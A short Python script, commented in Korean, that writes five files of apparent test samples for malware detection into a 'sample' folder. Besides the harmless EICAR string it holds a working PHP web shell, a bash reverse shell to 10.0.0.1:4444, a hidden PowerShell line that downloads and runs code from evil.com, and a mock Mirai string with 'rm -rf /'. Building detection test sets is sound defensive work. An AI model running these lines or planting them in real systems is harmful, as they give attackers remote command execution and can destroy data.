import os

# 샘플 디렉토리 생성
SAMPLE_DIR = "sample"
if not os.path.exists(SAMPLE_DIR):
    os.makedirs(SAMPLE_DIR)
    print(f"📁 '{SAMPLE_DIR}' 폴더 생성 완료")

# 악성 파일 데이터 (파일명: 내용) - 핵심 5종 선정
malware_samples = {
    # 1. Standard Test (바이러스 탐지 표준)
    "01_eicar.com": r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    
    # 2. PHP Web Shell (웹 서버 공격)
    "02_simple_shell.php": "<?php system($_GET['cmd']); ?>",
    
    # 3. Shell Script (리눅스 공격)
    "03_reverse_bash.sh": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    
    # 4. PowerShell (윈도우 공격 / 파일리스)
    "04_powershell_download.ps1": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://evil.com/payload.exe'))\"",
    
    # 5. IoT Botnet Binary (바이너리 탐지)
    "05_mirai_botnet.arm": "\x7fELF... MIRAI_BOTNET_STRING... /bin/busybox rm -rf /"
}


print(f"🚀 샘플 파일 생성 시작 ({len(malware_samples)}개)...")

for filename, content in malware_samples.items():
    file_path = os.path.join(SAMPLE_DIR, filename)
    with open(file_path, "w") as f:
        f.write(content)
    print(f"  ✅ 생성됨: {filename}")

print("\n✨ 모든 샘플 파일 생성이 완료되었습니다!")
print(f"📁 위치: {os.path.abspath(SAMPLE_DIR)}")
